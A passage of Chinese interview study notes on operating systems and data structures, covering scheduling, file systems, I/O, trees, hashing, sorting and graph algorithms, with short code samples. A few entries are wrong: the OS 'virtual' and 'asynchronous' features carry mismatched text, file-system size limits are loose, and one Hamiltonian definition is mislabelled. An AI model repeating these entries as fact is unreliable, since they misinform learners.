作业的地址空间首先被分成若干个逻辑段，段内要求连续， 段间不要求连续

③段页式存储 

在段页式系统中，作业的地址空间首先被分成若干个逻辑段， 每段都有自己的段号，然后再将每一段分成若干个大小固定的页 。 对内存空间的管理仍然和分页存储管理一样，将其分成若干个和页面大小相同的存储块，对内存的分配以存储块为单位。



#### 22、windows 两种文件系统,区别

* FAT 
  * 是传统的文件系统
  * 单个文件容量区别：FAT32在实际运行中不支持单个大于4GB的文件，一旦超过容量限制那么系统就会提示磁盘空间不足。
  * 容量小：FAT支持最大分区的大小为32GB
  * 安全性：不支持安全设置
  * 应用：多用于u盘、内存卡等小型磁盘

* NTFS 
  * 容量大：NTFS可以支持的分区(如果采用动态磁盘则称为卷)大小可以达到2TB。
  * 可恢复性:之所以要建立新的 win2k 文件系统,就是为了具备从系统崩溃和磁盘故障中恢复的能力
  * 安全性:NTFS可以针对电脑用户对该格式下所有的文件夹、文件进行加密、修改、运行、读取目录及写入权限的设置。
  * 多数据流:文件的实际内容被当作字节流处理,在 NTFS 中可以为一个文件定义多个数据流;
  * 通用索引功能:每个文件都有一组属性与之关联.这样,文件管理系统中文件描述的集合组织成一个关系数据库,因而文件可以建立关于任何属性的索引
  * 应用：用于电脑、移动硬盘

#### 23、CPU 调度算法/进程调度算法？

* 先来先服务（FCFS）调皮算法
  FCFS 调度算法是一种最简单的调度算法，该调度算法既可以用于作业调度也可以用于进程 调度。在作业调度中，算法每次从后备作业队列中选择最先进入该队列的一个或几个作业，将它们调入内存，分配必要的资源，创建进程并放入就绪队列 。

* 短作业优先（ SJF）调皮算法

  从后备队列中选择一个或若干个估计运行时间最短的作业，将它们调入内存运行。

  短进程优先（ SPF）调度算法，则是从就绪队列中选择一个估计运行时间最短的进程，将处理机分配给它，使之立即执行，直到完成或发生某事件而阻塞时，才释放处理机。

* 优先级调度算法
  该算法既可以用于作业调度，也可以用于进程调度 ， 该算法中的优先级用于描述作业运行的紧迫程度。
  在作业调度中 ， 优先级调度算法每次从后备作业队列中选择优先级最高的一个或几个作业， 将它们调入内存，分配必要的资源，创建进程井放入就绪队列。

  在进程调度中，优先级调度算法每次从就绪队列中选择优先级最高的进程，将处理机分配给它，使之投入运行。

* 高响应比优先调度算法

  高响应比优先调度算法主要用于作业调度，该算法是对 FCFS 调度算法和 SJF 调度算法的一种综合平衡，同时考虑每个作业的等待时间和估计的运行时间。在每次进行作业调度时，先计算后备作业队列中每个作业的响应比，从中选出响应比最高的作业投入运行。

* 时间片轮转调度算法

  <u>应用在分时操作系统上。</u>

  在这种算法中，系统将所有就绪进程按到达时间 的先后次序排成一个队列，进程调度程序总是选择就绪队列中第一个进程执行，即先来先服务的 原则，但仅能运行一个时间片，如 100ms。在使用完一个时间片后，即使进程并未完成其运行，它也必须释放出（被剥夺〉处理机给下一个就绪的进程，而被剥夺的进程返回到就绪队列的末尾 重新排队，等候再次运行 。

* 多级反馈队列调度算法 （集合了前几种算法的优点）
  多级反馈队列调度算法是时间片轮转调度算法和优先级调度算法的综合和发展。
  通过动态调整进程优先级和时间片大小，多级反馈队列调度算法可以兼顾多方面的系统目标 。 

  * 终端型作业用户：短作业优先。 

  * 短批处理作业用户：周转时间较短。 

  * 长批处理作业用户：经过前面几个队列得到部分执行，不会长期得不到处理。

#### 24、为什么不能弄一个大的进程，把系统中所有的线程都包含进去

首先如果大进程阻塞了，所有线程也被阻塞

而且进程是资源分配的基本单元，不同的程序运行，产生多个进程。若整个系统只是一个大进程，不仅系统资源利用率低，并行度小，而且关系混乱

#### 25、操作系统引入内核模式和用户模式为了解决什么问题?（10年面试官提问）

* 内核模式：

  可以访问所有的内存地址空间， 并且可以访问所有的CPU指令

* 一般程序运行在用户模式， 通过系统调用切换到内核模式执行系统功能

* 目的
  * 安全性。有些cpu指令如果用错，将会导致整个系统崩溃。 分了内核态和用户态后，当用户需要操作这些指令时候，内核为其提供了API，可以通过系统调用陷入内核，让内核去执行这些操作。
  * 把用户程序和系统程序区分开，以利于程序的共享和保护。

* 用户态转向核心态的例子
  * 用户程序要求操作系统的服务，即系统调用。
  * 发生一次中断
    * linux下为`int $0x80`
    * windows下为`int 21h`
  * 用户程序中产生了一个错误状态
  * 用户程序中企图执行一条特权指令
  * 从核心态转向用户态由一条指令实现，这条指令也是特权命令。一般是中断返回指令



![image-20200311162202095](/Users/godspeed/Library/Application Support/typora-user-images/image-20200311162202095.png)

**缺点：**增加了系统复杂度和系统开销。

#### 26、操作系统的基本特征/特点？（10年面试官提问）

* 并发（同一时间间隔内可以运行多个程序）

  操作系统具有处理和调度多个程序同时执行的能力。

* 共享

  系统中的资源可供内存中多个并发执行的进程共同使用

* 虚拟

  内核模式可以访问所有的内存地址空间， 并且可以访问所有的CPU指令。一般程序运行在用户模式， 通过系统调用切换到内核模式执行系统功能

* 异步

  并发是指两个或多个事件在同一时间间隔内发生。操作系统的并发性是指计算机系统中同时存在多个运行着的程序，因此它具有处理和调度多个程序同时执行的能力。在操作系统中 ， 引入 进程的目的是使程序能并发执行。

#### 27、操作系统是干什么的/功能？如果没有的话会怎样？（10年面试官提问）

> 后一问属于开放性回答，考验应变能力

* 管理计算机系统资源

  * 处理机管理

  * 存储器管理

    内存分配、地址映射、内存保护与共享、内存扩充

  * 设备管理

    缓冲管理、设备分配、设备处理、虚拟设备

  * 文件管理

    文件存储空间管理、目录管理、文件读写管理和保护

* 为用户与计算机硬件系统之间提供接口

  * 命令接口

    用户利用这些操作命令来组织和控制作业的执行

  * 程序接口

    编程人员可以使用它们来请求操作系统服务，即系统调用命令

如果没有的话，计算机退化为裸机，只能完成十分简单的功能，如逻辑运算等。

#### 28、虚地址和实地址的区别，在程序中计算机用的虚地址还是实地址？

现代操作系统普遍采用虚拟内存管理（Virtual Memory Management）机制，这需要MMU（Memory Management Unit，内存管理单元）的支持。

**物理地址（Physical Address）**

如果处理器没有MMU，或者有MMU但没有启用，CPU执行单元发出的内存地址将直接传到芯片引脚上，被物理内存接收

**虚拟地址（Virtual Address）**

如果处理器启用了MMU，CPU执行单元发出的内存地址将被MMU截获，从CPU到MMU的地址称为虚拟地址，而MMU将这个地址翻译成另一个地址发到CPU芯片的外部地址引脚上，也就是将虚拟地址映射成物理地址。

现代计算机的程序用的都是虚拟地址。

#### 29、除了中断，CPU还有什么控制I/O的方式？

* 程序直接控制方式(Polling,轮询)

  * 计算机从外部设备读取数据到存储器，每次读一个字的数据。对读入的每个字， CPU 需要对外设状态进行循环检查，直到确定该字已经在控制器的数据寄存器中。

    * CPU 利用率相当低 

      CPU 绝大部分时间都处于等待 I/O 设备完成数据 I/O 的循环测试中，造成 CPU 资源的极大浪费

    * 简单易实现

* 中断驱动方式（Interupt）

  允许I/O设备主动打断 CPU 的运行并请求服务，从而“解放” CPU, 使得其向I/O控制器发送读命令后可以继续做其他有用的工作

* DMA方式（Direct Memory Access，直接存储器存取）

  在中断驱动方式中，I/O还是受限，而 DMA 方式的基本思想是在 I/O 设备和内存之间开辟直接的数据交换通路，彻底“解放” CPU。

  * 基本单位是数据块
  * 所传送的数据，是从设备直接送入内存的，或者相反
  * 仅在传送一个或多个数据块的开始和结束时，才需 CPU干预，整块数据的传送是在 DMA 控制器的控制下完成的

* 通道控制方式（Channel）

  进一步减少CPU的干预，即把对一个数据块的读（或写）为单位的干预，减少为对一组数据块的读（或写）及有关的控制和管理为单位的干预。同时，又可以实现 CPU、通道和 I/O 设备三者的并行操作，从而更有效地提高整个系统的资源利用率。

#### 30、键盘输入是怎么实现的？

基本实现过程如下：

* 键盘上的芯片产生扫描码，按下称为通码，弹起称为断码
* 扫描码被送入60端口
* 引导9号中断
* cpu执行int9中断处理键盘输入

#### 31、分段和分页的区别

* 页
  * 信息的物理单位，分页是为了实现离散分配方式，以消减内存的外零头，提高内存的利用率。分页仅仅是由于系统管理的需要而不是用户的需要
  * 页的大小固定，由系统把逻辑地址划分为页号和页内地址两部分
  * 作业地址空间是一维的

* 段
  * 是信息的逻辑单位，分段的目的是为了能更好地满足用户的需要
  * 段的长度却不固定，决定于用户所编写的程序
  * 作业地址空间是二维的，在标识一个地址时，即需给出段名，又需给出段内地址

#### 32、select、poll、epoll的区别？

我们可以采用多进程方式实现服务器端，每来一个客户端，我们给他创建多个工作子进程并提供服务。由于系统创建进程是需要消耗大量资源的，所以当业务量增长，会导致系统资源不足。

引入IO多路复用（IO multiplexing）解决这些问题，实现服务器在高并发下的正常工作。

* select

  select函数有一个参数是文件描述符（fd）的集合，该函数会对这些fd进行循环监听，当某个fd就绪的时候，就对这个fd进行处理。

  优点：跨平台

  时间复杂度：O（n）

  缺点：文件描述符数量存在上限，比较耗时

* poll 时间复杂度O(n)

  通过链表解决 select 文件描述符受限的问题。数组中元素是结构体，该结构体保存描述符的信息，每增加一个文件描述符就向数组中加入一个结构体，结构体只需要拷贝一次到内核态。轮询的问题未解决。

* epoll 时间复杂度O(1)

  轮询排查所有文件描述符的效率不高，使服务器并发能力受限。因此，epoll 采用就绪队列，就绪的fd会触发回调函数，将其自身放到就绪队列里，便解决了轮询的瓶颈。

### 五、数据结构

####  1、介绍分治算法，回溯算法

* 分治算法的基本思想是将一个规模为 N 的问题分解为 K 个规模较小的子问题， 这些子问题相互独立且与原问题性质相同。求出子问题的解，就可得到原问题的解。

  分治法解题的一般步骤：

  * 分解，将要解决的问题划分成若干规模较小的同类问题；
  * 求解，当子问题划分得足够小时，用较简单的方法解决；
  * 合并，按原问题的要求，将子问题的解逐层合并构成原问题的解

* eg:[找出伪币] 给你一个装有1 6个硬币的袋子。1 6个硬币中有一个是伪造的， 并且那个伪造的硬币比真的硬币要轻一些。你的任务是找出这个伪造的硬币。

  解：用分治算法的思想：16个硬币分成两堆（8个一堆），用仪器称重，伪币在轻的一堆里面，然后再对有伪币的8个硬币进行划分

  

* 回溯算法：回溯法有“通用的解题法”之称，它可以系统地搜索一个问题的所有解或任一解。回溯法是一个既带有系统性又带有跳跃性的搜索算法。它在包含问题所有解的解空间中，按照深度优先的策略，从根结点出发搜索解空间树。算法搜索至解空间树的任一节点时，总是先判断该节点是否肯定不包含问题的解。如果肯定不包含，则跳过对以该节点为根的子树的系统搜索，逐层向前祖先节点回溯。否则进入该子树，继续按深度优先的策略进行搜索。回溯法在用来求解问题的所有解时，要回溯到根，且根节点的所有子树都已被搜索遍才结束。当用此法求解问题的任一解时，只要搜索到问题的一个解就可结束。这种以深度优先的方式系统地搜索问题的解的算法称为回溯法，它适用于解一些组合数较大的问题

  


#### 2、分支定界法和回溯法有什么区别？能不能举个例子说明一下?

* **分支定界法——广度搜索优先**

  每一个活结点只有一次机会成为扩展结点，一旦成为扩展结点，就一次性产生所有儿子结点，并舍弃不可行解或非最优解的子结点。其余儿子结点加入活结点表。此后，从活动结点表中取出下一结点成为当前扩展结点，并重复以上过程

* **回溯法——深度优先搜索**
   回溯法是一种选优搜索法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的方法称为回溯法。

#### 3、赢者树

锦标赛排序使用的树型，每个非终端节点均表示其左右孩子节点中的胜者。

#### 4、Hash 有什么用，hash 表有什么用，hash的三个属性/特点，解决哈希冲突（常见考点）

（以查找为基础发展起来）线性表或者树结构中记录在结构中的相对位置随机， 和记录的关键字之间没有确定的关系，因此，在结构中查找记录时需进行一系列和关键字的比较。这一类查找方法建立在“比较”的基础上。查找的效率依赖于查找过程  中所进行的比较次数。理想的情况是不经过任何比较，一次存取便能得到所查记录， 那就必须在记录的存取位置和它的关键字之间建立一个确定的对应关系 F（我们称之为哈希函数）。按哈希函数所建立的存储结构即是 hash 表。

**作用**

* 文件校验
  例如MD5 Hash算法的"数字指纹"特性，使它成为应用最广泛的一种文件完整性校验和(Checksum)算法，不少Unix系统有提供计算md5 checksum的命令。

* 数字签名

  由于非对称算法的运算速度较慢，所以在数字签名协议中，单向散列函数扮演了一个重要的角色。对 Hash 值，又称"数字摘要"进行数字签名，在统计上可以认为与对文件本身进行数字签名是等效的。

**特点（不同教科书可能不一致）**

* 快速性：对于任意一个输入值 x，由 Hash 函数 H (x），计算 Hash值 y，即 y=H (x）是非常容易的。
* 单向性：对于任意一个输出值 y，希望反向推出输入值 x，使得y=H (x），是非常困难的。
* 无碰撞性：包括强无碰撞性和弱无碰撞性，一个好的 Hash 函数应该满足强无碰撞性，即找到两个不同的数字串 x 和 y，满足 H (x) =H (y），在计算上是不可能的

**解决hash冲突**

* 线性探测

  往下一个个找直到可以放元素 step=1

* 平方探测

  与线性探测类似，step=±i^2

* 链地址法

  分配到同一个索引上的多个节点可以用这个单向链表连接起来

#### 5、B 树和 B+树(难点、常见考点)

##### B树（也写成B-树，他的英文Balance-Tree 缩写 B-Tree，导致很多人搞晕，叫成B减树）

* 多路平衡查找树，并不是二叉的
* 关键字分布在整颗树上
* 任何一个关键字出现且只出现在一个结点中
* 详细定义：一棵 m阶 B 树或为空树，或为满足如下特性的 m 叉树
  * 树中每个结点至多有 m棵子树 （即至多含有 m-1 个关键宇）
  * 若根结点不是终端结点，则至少有两棵子树。 
  * 除根结点外的所有非叶结点至少有⌈m/2⌉ 棵子树（即至少含有⌈m/2⌉-1 个关键宇 ） 
  * 所有的叶结点都出现在同一层次上，并且不带信息 （可以看做是外部结点或者类似于折半查找判定树的查找失败结点 ， 实际上这些结点不存在，指向这些结点的指针为空）。
  * B 树是所有结点的平衡因子均等于 0 的多路查找树。
* ![image-20200310224237065](/Users/godspeed/Library/Application Support/typora-user-images/image-20200310224237065.png)

* 插入：若插入之后符合定义则不用管，不符合则要分裂

  ![image-20200310224910458](/Users/godspeed/Library/Application Support/typora-user-images/image-20200310224910458.png)

##### B+树

B＋树是应数据库所需而出现的一种 B 树的变形树。
一棵 m 阶的 B＋树需满足下列条件：

* 每个分支结点最多有 m棵子树
* 非叶根结点至少有两棵子树，其他每个分支结点至少有⌈m/2⌉棵子树。
* 结点的子树个数与关键字个数相等
* 所有叶结点包含全部关键字及指向相应记录的指针，而且叶结点中将关键宇按大小顺序 排列，并且相邻叶结点按大小顺序相互链接起来。
* 所有分支结点中仅包含它的各个子结点（即下一级的索引块） 中关键字的最大值及指向其子结点的指针。

![image-20200310225536784](/Users/godspeed/Library/Application Support/typora-user-images/image-20200310225536784.png)

 

因此，可以对 B＋树进行两种查找运算： 一种是从最小关键字开始的顺序查找，另一种是从根结点开始，进行多路查找。



#### 6、为什么说B+tree比B树更适合实际应用中操作系统的文件索引和数据库索引？

（1) B+tree的磁盘读写代价更低
B+tree的内部结点并没有指向关键字具体信息的指针。因此其内部结点相对B树更小。如果把所有同一内部结点的关键字存放在同一盘块中，那么盘块所能容纳的关键字数量也越多。一次性读入内存中的需要查找的关键字也就越多。相对来说IO读写次数也就降低了。

举个例子，假设磁盘中的一个盘块容纳16bytes，而一个关键字2bytes，一个关键字具体信息指针2bytes。一棵9阶B-tree(一个结点最多8个关键字)的内部结点需要2个盘快。而B+ 树内部结点只需要1个盘快。当需要把内部结点读入内存中的时候，B 树就比B+ 树多一次盘块查找时间(在磁盘中就是盘片旋转的时间)。

（2）B+tree的查询效率更加稳定
由于非叶子结点并不是最终指向文件内容的结点，而只是叶子结点中关键字的索引。所以任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当。

（3）B树在提高了磁盘IO性能的同时并没有解决元素遍历的效率低下的问题。正是为了解决这个问题，B+树应运而生。B+树只要遍历叶子节点就可以实现整棵树的遍历。而且在数据库中基于范围的查询是非常频繁的，而B树不支持这样的操作（或者说效率太低）

#### 7、链表和数组各有什么优缺点？一维数组和二维数组的区别？

* 链表

  用链表实现列表.链表结点的插人或删除操作不再需要移动结点，只需改变相关的结点中的后继结点指针的值即可，与结点的实际存储位置无关

* 数组
  * 在内存中，数组是一块连续的区域。 
  * 数组需要预留空间，在使用前要先申请占内存的大小，可能会浪费内存空间。 
  * 插入数据和删除数据效率低，插入数据时，这个位置后面的数据在内存中都要向后移。
  * 随机读取效率很高。因为数组是连续的，知道每一个数据的内存地址，可以直接找到给地址的数据。
  * 并且不利于扩展，数组定义的空间不够时要重新定义数组。



二维数组它虽然看起来是一行一行进行排列，但实际是所有元素在同一行



#### 8、快速排序和归并排序的优缺点，时间复杂度问题

* 快排
  * 优点：一般情况下O（NlogN）效率很高
  * 缺点：不稳定排序，如果数据基本有序复杂度可能退化为 O(N^2） 

* 归并排序
  * 优点：一般情况下O（NlogN），稳定
  * 缺点：空间复杂度O(N)，用的额外空间比较多



#### 9、举一个可以应用分支定界解决的问题

背包问题

 问题：一个容量为10的集装箱，有重量分别为4,8,5的货物，如何才能装最多

把全部可行解空间反复地分割为越来越小的子集，称为分枝；并且对每个子集内的解集计算一个目标下界（对于最小值问题），这称为定界。在每次分枝后，凡是界限超出已知可行解集目标值的那些子集不再进一步分枝，这样，许多子集可不予考虑，这称剪枝。这就是分支定界法的主要思路。

![image-20200304221245704](/Users/godspeed/Library/Application Support/typora-user-images/image-20200304221245704.png)

#### 10、 红黑树

> 了解即可，掌握应用

红黑树在业界应用很广泛，比如 Java 中的 TreeMap，JDK 1.8 中的 HashMap、C++ STL 中的 map 均是基于红黑树结构实现的。

红黑树是一种含有红黑结点并能自平衡的二叉查找树。它必须满足下面性质：

- 性质1：每个节点要么是黑色，要么是红色。
- 性质2：根节点是黑色。
- 性质3：每个叶子节点（NIL）是黑色。
- 性质4：每个红色结点的两个子结点一定都是黑色。
- **性质5：任意一结点到每个叶子结点的路径都包含数量相同的黑结点。**

![image-20200310231409507](/Users/godspeed/Library/Application Support/typora-user-images/image-20200310231409507.png)



#### 11、第K大的数/中位数/TOPK

* 找第k大的数

  设总的个数为n，（a[1],a[2],...a[n]）

  当n为奇数的时候，中位数为 `a[(n+1)/2]`

  当n为偶数的时候，中位数为 `(a[n/2]+a[n/2+1])/2`

  我们如果不计时间，可以直接快排，但是这真的有必要吗？

  我们知道快排实质上是一种分治，当我们找到一个数x，把数组中比他大的数放到右边，比他小的放到左边，我们同时也知道这个x在整个数组中的位置，如果这个位置就是我们的k，直接返回他的值，如果大于k我们在右边那一堆里找，如果小于k就去左边找。

* 中位数

  原理是类似的。

  简易代码辅助理解。

* TOPK

  工作面试常见问题，面试官都爱问。

  显然也是类似的。

  实际工作中也可以用堆来维护。

```cpp
#include<bits/stdc++.h>
using namespace std;
int a[] = {0,6,2,3,7,1,4,5,8,9,10};
void disp(int l, int r){
    for(int i = l ; i<=r;++i){
        printf("%d%c",a[i],i==r?'\n':' ' );
    }
}
int quick_sort(int low,int high,int k){
    int pivot = a[low];
    int j = high;
    int i = low;
    while(i<j){
        while(a[j]>pivot&&i<j){
            j--;
        }
        a[i] = a[j];
        while(a[i]<pivot&&i<j){
            i++;
        }
        a[j] = a[i];
    }
    a[i] = pivot;
    if(i==k) return a[i];
    else if(k<i){
        return quick_sort(low,i-1,k);    
    }
    else{
        return quick_sort(i+1,high,k);    
    }
}
int find_kth(int k){
    return quick_sort(1,10,k);
}
int main(){
    int tot = 10;
    if(tot&1){
        cout<<find_kth((tot+1)/2)<<endl;        
    }
    else{
        cout<<(find_kth(tot/2)+find_kth(tot/2+1))/2.0<<endl;        
    }
    disp(1,10);
    return 0;
}

5.5
1 2 3 4 5 6 7 8 9 10
```



#### 12、一堆无序的元素怎么用二叉搜索树（Binary Search Tree）查找？

定义如下：

a.若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 
b.若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 
c.它的左、右子树也分别为二叉排序树。

先把树建起来，然后正常查找即可。比如想查找某个数字X，从根节点开始比较。如果X比根节点大，则去与根节点的右节点比较，如此类推，直到找到X（或子节点为空）为止。

#### 13、桶排序的限制条件？

因为我们一般桶排序都是用数组实现的，因此对数组的下标有限制，如果要比较的数据比较大，可以将其映射一下（比如用map）。

#### 14、快速排序（多年面试官提问）

快速排序有多种实现方式。

- 先从数列中取第一个数作为基准数。
- 分区过程，将比这个数大的数全放到它的右边，小于或等于它的数全放到它的左边。
- 3．再对左右区间重复第二步，直到各区间只有一个数。 

快排对于接近有序的数组，不能发挥其实力。

#### 15、图的存储方式有哪些？优缺点？（10年面试官提问）

* 邻接矩阵

  当图为稠密图、顶点较少时使用比较合适，否则浪费空间。

* 邻接表

  当图为稀疏图、顶点较多，即图结构比较大时，更适宜选择邻接表作为存储结构。

  缺点：

  对有向图，如需知道顶点的入度时，可能需要遍历大量链表。

  对于无向图，如果需要删除一条边，就需要在两个链表上查找并删除。

#### 16、堆排序

首先将存放在 L[l...n］中的 n 个元素建成初始堆（如大顶堆），由于堆本身的特点（以大顶堆为例），堆顶元素就是最大值。输出堆顶元素后，通常将堆底元素送入堆顶，此时根结点己不满足大顶堆的性质，堆被破坏，将堆顶元素向下调整使其继续 保持大顶堆的性质，再输出堆顶元素。如此重复，直到堆中仅剩下一个元素为止

#### 17、二分搜索（折半查找）

在1-100 挑一个数，心中想好一个数字如77

```python
def BinarySearch(x):
	low = 1
	high = 100
	while (low<high):
		mid = (low+high)>>1
		if x>mid:
			low = mid + 1
		else:
			high = mid
		print(low,high)
BinarySearch(77)

"""
(51, 100)
(76, 100)
(76, 88)
(76, 82)
(76, 79)
(76, 77)
(77, 77)
"""
```

#### 18、拓扑排序

拓扑排序是对有向无环图的顶点的一种排序，它使得如果存在一条从顶点 A 到 顶点 B 的路径，那么在排序中顶点 B 出现在顶点 A 的后面 

* 如何获得拓扑排序
  * 1.先把入度为0的挑出来
  * 2.对步骤1的每个点Ai，对这些点所能到达的下个节点Bij（Ai->Bij），将Bij的入度减1
  * 3.重复1，2
* 如何获得逆拓扑排序
  * 法一：反向建图
  * 法二：深度优先遍历
    * 最先退出算法的顶点即是出度为0的顶点（先退出来的顶点没有邻边）：退出算法指所遍历的顶点退出当前系统栈
    * 我们只要在退出当前系统栈时输出当前节点的标号即可

```cpp
#include <bits/stdc++.h>
using namespace std;
int G[10][10];
int vis[10];
int n = 6;
void dfs(int x){
	for(int i = 1; i <= n; ++i){
		if(!vis[i]&&G[x][i]){
			vis[i] = 1;
			dfs(i);
		}	
	}
	cout<<x<<" ";//这个时候我们从x出发可以访问的节点都已经访问完了
}
int main(){
	// Case1:
	// G[1][2] = G[2][3] = G[3][4] = G[4][5] = G[5][6] = 1;
	// Case2:
	G[1][2] = G[1][4] = G[1][5] = G[2][3] = G[4][3] = G[5][3] = G[3][6] = 1;
	vis[1] = 1;
	dfs(1);
	return 0;
}
/*
6 3 2 4 5 1
*/
```



#### 19、贪心法与动态规划（常见面试问题）

* 从求解树角度来看：

  * BFS：一般的求解树我们用BFS来搜索，必要情况下剪枝。
  * 动态规划：有些求解树，中间很多结点是重合的，结点个数比所有搜索分支的个数少很多个数量级。这类问题较特殊，我们可以保存中间的搜索过程。而记忆化搜索和动态规划本质上就是一个东西，快就快在可以不用重复计算很多中间结果（所谓的最优子问题）。

  * 贪心：还有一些求解树，它们不止有很多重复结点，而且每次选择分支的时候，我们可以证明只要选择一个分支，这个分支的解就一定比其他选择更优。

    eg：对矩阵的每一行取一个值，让这些值的和加起来最大。显然我们可以贪心选择每行最大的那个值。

* 从算法的思想来看

  * 贪心算法：不从整体考虑，用局部的，仅有数据做出选择，且以后不会改变。

  * 动态规划：从局部到整体的递推问题，子结构最优使得整体最优。

    具有三个特性

    * 最优子结构：问题的最优解包含子问题的最优解。反过来说就是，我们可以通过子问题的最优解，推导出问题的最优解。
    * 无后效性：第一层含义：在推导后面阶段状态的时候，我们只关心前面阶段的状态值，不关心这个状态怎么来的。第二层含义：某阶段状态一旦确定，就不受之后阶段的决策影响
    * 重复子问题：不同的决策序列，到达某个相同的阶段时，可能会产生重复的状态

* 联系

  动态规划和贪心算法都具有最优子结构。

* 区别

  动态规划是自底而上的一种递推。

  贪婪算法是自上而下的，自根开始，选择当前最优的路，一直走到底。

   

#### 20、dijkstra算法

dijkstra 本质上的思想是贪心,它只适用于不含负权边的图.

* 算法思想：

  * 设已经计算好到起点最短路的节点集合为S，剩下的为T。
  * 初始状态时，集合`S`中只包含起点` V0`
  * 不断从集合 `T` 中选取到顶点 `V0`路径最短的顶点`Vu`并加入集合 S 中。
  * 集合`S`每加入一个新的顶点`Vu`，都要修改`V0`到集合`T`中各个顶点的最短路径的长度值。
  * 不断重复这个过程，直至集合 T 中的顶点全部并入到 S 中为止。

* 时间复杂度

  朴素的dijkstra是O（n^2），但是在选`v0`到其他顶点的最短长度时，可以使用最小堆，复杂度降为O（nlogn）

* dijkstra算法和prim算法有哪些相似之处？

  都基于贪心策略，刚开始先选一个点，然后选择权值最小的边，逐渐把点集扩大

  PS：关于dijkstra是贪心还是动规，意见不一，具体可看知乎。

* dijkstra算法为什么是正确的？

  用数学归纳法证明。

  * 当n=0时，d[v0]=0，显然这个是v0的最短路径
  * 假设当n=k时，我们找出了点v1,v2,v3...vk到v0的最短路径d[v1],d[v2]...d[vk]，也就是说我们已经求出了k个离起点距离最近的点。
  * 接下来要证当n=k+1时,我们使用dijkstra可以求出第k+1个离起点距离最近的点vk+1和d[vk+1]。
    * 首先v0到vk+1的最短路上不会经过除了「v0，v1...vk」的点，这是因为如果存在其他点X，那么这个X相比vk+1一定离v0更近，也就是说vk+1可以通过「v0，v1...vk」这些点松弛得到，而「v0，v1...vk-1」在上轮已经松弛过，因此这一轮只需要松弛vk这个新加入的点即可，这也正是dijkstra所做的事情。

#### 21、排序算法汇总

记忆口诀：快（快速）些（希尔）选（选择）堆  不稳定 的排序出来。

![image-20200317214444012](/Users/godspeed/Library/Application Support/typora-user-images/image-20200317214444012.png)

#### 22、什么是汉密顿（哈密顿）回路？什么是欧拉回路？

* 欧拉强调边

欧拉通路：图中行遍所有顶点且恰好经过每条边一次的通路。

欧拉回路：图中行遍所有顶点且恰好经过每条边一次的回路。

欧拉图：有欧拉回路的图

半欧拉图：有欧拉通路而无欧拉回路的图。

* 哈密顿强调顶点

哈密顿通路：经过图中所有顶点一次且仅一次的通路。

哈密顿回路：经过图中所有顶点一次且仅一次的回路。

哈密顿图：具有哈密顿回路的图。

哈密顿图：具有哈密顿通路而无哈密顿回路的图。



#### 23、单链表如何判断是否有环（常年大厂面试题）

* 快慢指针
  思想：在一个环形跑道上，两个运动员在同一地点起跑，一个运动员速度快，一个运动员速度慢。当两人跑了一段时间，速度快的运动员必然会从速度慢的运动员身后再次追上并超过，原因很简单，因为跑道是环形的。

  在这道题中，如果链表有环，跑一段时间后两个指针都会进入环形跑道，之后一定能碰到。

  复杂度是O（n）的，非常有趣的一个算法。

  ```cpp
  bool find_circle(node *slow,node *quick){
  	while(true){
  		if(!slow) return false;//如果链表是一个环，则不会有NULL节点，有NULL节点的一定是直链
  		slow = slow->next;
  		if(!quick) return false;
  		quick = quick->next;
  		if(!quick) return false;
  		quick = quick->next;
  		if(slow&&quick&&slow==quick){
  			return true;
  		}
  	}
  	return false;
  }
  ```

**延伸问题：怎么找出环的入口？**

我们已经可以找到相碰点了。

![image-20200327235324286](/Users/godspeed/Library/Application Support/typora-user-images/image-20200327235324286.png)
$$
slow = s = a+x
\\
fast = 2s
\\
fast = slow+n*L
\\
s=n*L
\\
a+x=(n-1)*L+L
\\
a=(n-1)*L+L-x
$$
这说明，我们可以从相遇点（红色的点）和起始点各设置一个指针，让他们一直往前走，他们一定会在环的入口相遇，记录一个走的长度即可。

**继续延伸：如果是双向链表呢？（假设不是循环的那种双向链表）**

其实跟单链表判断环的方法相似，我们从前往后找一次，从后往前再找一次。

* 第一步就按照原来的单链表判断方法。先看next指针会不会出现环。

* 从尾指针开始往前找：判断pre指针是否可能出现环。值得注意的是，如果在第一步判断链表有next环后是无法进行第二步判断的，因为找不到尾节点。

**镜像问题：408出现过**

两个单链表如果相交，怎么找出相交点

* 遍历链表记录长度。时间复杂度O（len1+len2）

  * 同时遍历两个链表到尾部，同时记录两个链表的长度。
  * 有两个链表的长度后，我们就可以知道哪个链表长，设较长的链表长度为len1,短的链表长度为len2。
  * 先让较长的链表向后移动(len1-len2)个长度。然后开始从当前位置同时遍历两个链表，当遍历到的链表的节点相同时，则这个节点就是第一个相交的节点。

* 转化问题：看图，转换成上面那个延伸问题，代码上会复杂一些

  ![image-20200327233244447](/Users/godspeed/Library/Application Support/typora-user-images/image-20200327233244447.png)

#### 24、从1000个不重复的随机抽取900个不重复的数字，要保证概率相等，不可以重复取（腾讯、阿里面试）

> 这道题也比较有意思

* 直觉：

  我们一般会有个直观的思路，随机选，然后判重，但是这可能在复杂度上是不可接受的，因为我们会大量的碰到重复的数字

* 逆向思维：

  1000个里选100个去掉

* 其实如果你接触过一些python的函数，我们会想到用`random.shuffle`

  ```python
  >>> import random
  >>> L = [i for i in range(10)]
  >>> random.shuffle(L)
  >>> L
  [9, 8, 5, 2, 1, 3, 6, 4, 0, 7]
  ```

  然后我们选前K个就可以了，我们来看看他是怎么实现的

  ```python
  >>> import inspect
  >>> print(inspect.getsource(random.shuffle))
      def shuffle(self, x, random=None):
          """Shuffle list x in place, and return None.
  
          Optional argument random is a 0-argument function returning a
          random float in [0.0, 1.0); if it is the default None, the
          standard random.random will be used.
  
          """
  
          if random is None:
              randbelow = self._randbelow
              for i in reversed(range(1, len(x))):
                  # pick an element in x[:i+1] with which to exchange x[i]
                  j = randbelow(i+1)
                  x[i], x[j] = x[j], x[i]
          else:
              _int = int
              # [0,1,2,...,len-1]
              for i in reversed(range(1, len(x))):#len-1,len-2 ... 2,1 从最后一个数开始
                  # pick an element in x[:i+1] with which to exchange x[i]
                  j = _int(random() * (i+1)) #随机挑一个自己及自己前面的数
                  x[i], x[j] = x[j], x[i] #交换位置
  ```

  他的底层就是著名的knuth-shuffle（最初版本叫Fisher–Yates shuffle/ Sattolo’s algorithm）
